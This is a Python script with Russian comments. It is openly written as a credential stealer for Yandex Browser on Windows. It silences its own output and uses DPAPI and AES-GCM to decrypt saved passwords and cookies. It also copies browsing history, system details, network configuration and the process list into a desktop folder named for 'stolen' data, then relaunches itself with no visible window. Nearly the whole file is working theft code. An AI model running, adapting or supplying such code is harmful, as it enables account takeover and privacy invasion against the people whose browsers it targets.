import os
import json
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import psutil
import logging
from datetime import datetime, timedelta
import subprocess
import sys

# Настройка скрытного выполнения
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

def get_yandex_browser_path():
    """Поиск пути к данным Яндекс.Браузера"""
    possible_paths = [
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'Application'),
        os.path.join(os.environ['USERPROFILE'], 'YandexBrowser', 'User Data')
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None

def get_encryption_key():
    """Извлечение ключа шифрования из Local State"""
    browser_path = get_yandex_browser_path()
    if not browser_path:
        return None
        
    local_state_path = os.path.join(browser_path, 'Local State')
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(password, key):
    """Расшифровка паролей"""
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return "Failed to decrypt"

def steal_passwords(key):
    """Кража паролей из базы данных"""
    passwords = []
    browser_path = get_yandex_browser_path()
    if not browser_path:
        return passwords
        
    login_data_path = os.path.join(browser_path, 'Default', 'Login Data')
    
    try:
        shutil.copy2(login_data_path, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            decrypted_password = decrypt_password(encrypted_password, key)
            if decrypted_password:
                passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}\n")
        
        conn.close()
        os.remove('temp_db')
        
    except Exception as e:
        pass
        
    return passwords

def steal_cookies(key):
    """Кража cookies"""
    cookies_data = []
    browser_path = get_yandex_browser_path()
    if not browser_path:
        return cookies_data
        
    cookies_path = os.path.join(browser_path, 'Default', 'Cookies')
    
    try:
        shutil.copy2(cookies_path, 'temp_cookies')
        conn = sqlite3.connect('temp_cookies')
        cursor = conn.cursor()
        
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
        
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_value = row[2]
            path = row[3]
            expires = row[4]
            
            decrypted_value = decrypt_password(encrypted_value, key)
            if decrypted_value:
                cookies_data.append(f"Host: {host}\nName: {name}\nValue: {decrypted_value}\nPath: {path}\nExpires: {expires}\n{'-'*50}\n")
        
        conn.close()
        os.remove('temp_cookies')
        
    except Exception as e:
        pass
        
    return cookies_data

def steal_history():
    """Кража истории браузера"""
    history_data = []
    browser_path = get_yandex_browser_path()
    if not browser_path:
        return history_data
        
    history_path = os.path.join(browser_path, 'Default', 'History')
    
    try:
        shutil.copy2(history_path, 'temp_history')
        conn = sqlite3.connect('temp_history')
        cursor = conn.cursor()
        
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            visit_count = row[2]
            visit_time = row[3]
            
            history_data.append(f"URL: {url}\nTitle: {title}\nVisits: {visit_count}\nLast Visit: {visit_time}\n{'-'*50}\n")
        
        conn.close()
        os.remove('temp_history')
        
    except Exception as e:
        pass
        
    return history_data

def steal_system_info():
    """Сбор системной информации"""
    system_info = []
    
    try:
        # Информация о системе
        system_info.append(f"Computer Name: {os.environ['COMPUTERNAME']}")
        system_info.append(f"Username: {os.environ['USERNAME']}")
        system_info.append(f"OS: {os.environ['OS']}")
        system_info.append(f"Processor: {os.environ['PROCESSOR_IDENTIFIER']}")
        system_info.append(f"Number of Processors: {os.environ['NUMBER_OF_PROCESSORS']}")
        
        # Диски
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                system_info.append(f"Drive {partition.device} - Total: {partition_usage.total//(1024**3)}GB, Used: {partition_usage.used//(1024**3)}GB, Free: {partition_usage.free//(1024**3)}GB")
            except:
                pass
                
        # Сетевые подключения
        connections = psutil.net_connections()
        system_info.append("\nActive Connections:")
        for conn in connections[:20]:  # Первые 20 соединений
            system_info.append(f"Local: {conn.laddr} -> Remote: {conn.raddr} | Status: {conn.status}")
            
    except Exception as e:
        system_info.append(f"Error collecting system info: {str(e)}")
        
    return system_info

def create_stolen_folder():
    """Создание папки для украденных данных"""
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    stolen_folder = os.path.join(desktop, 'спизженное')
    
    if not os.path.exists(stolen_folder):
        os.makedirs(stolen_folder)
        
    return stolen_folder

def main():
    """Основная функция выполнения"""
    try:
        # Получение ключа шифрования
        key = get_encryption_key()
        if not key:
            sys.exit(0)
            
        # Создание папки для данных
        stolen_folder = create_stolen_folder()
        
        # Кража паролей
        passwords = steal_passwords(key)
        if passwords:
            with open(os.path.join(stolen_folder, 'пароли.txt'), 'w', encoding='utf-8') as f:
                f.writelines(passwords)
        
        # Кража cookies
        cookies = steal_cookies(key)
        if cookies:
            with open(os.path.join(stolen_folder, 'куки.txt'), 'w', encoding='utf-8') as f:
                f.writelines(cookies)
        
        # Кража истории
        history = steal_history()
        if history:
            with open(os.path.join(stolen_folder, 'история.txt'), 'w', encoding='utf-8') as f:
                f.writelines(history)
        
        # Системная информация
        system_info = steal_system_info()
        if system_info:
            with open(os.path.join(stolen_folder, 'система.txt'), 'w', encoding='utf-8') as f:
                f.write('\n'.join(system_info))
        
        # Дополнительные данные
        try:
            # Клавиатурные сокращения
            with open(os.path.join(stolen_folder, 'сеть.txt'), 'w') as f:
                subprocess.run(['ipconfig', '/all'], stdout=f, stderr=subprocess.DEVNULL)
                
            # Процессы
            with open(os.path.join(stolen_folder, 'процессы.txt'), 'w') as f:
                for proc in psutil.process_iter(['pid', 'name']):
                    f.write(f"{proc.info['pid']}: {proc.info['name']}\n")
                    
        except:
            pass
            
    except Exception as e:
        pass
        
    finally:
        # Самоуничтожение процесса
        sys.exit(0)

if __name__ == '__main__':
    # Запуск в фоновом режиме
    if sys.argv[0].endswith('.py'):
        # Создание исполняемого файла
        with open('browser_helper.exe', 'wb') as f:
            f.write(b'')  # Здесь должен быть скомпилированный код
        
        # Запуск как служба
        subprocess.Popen([sys.executable, __file__], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        main()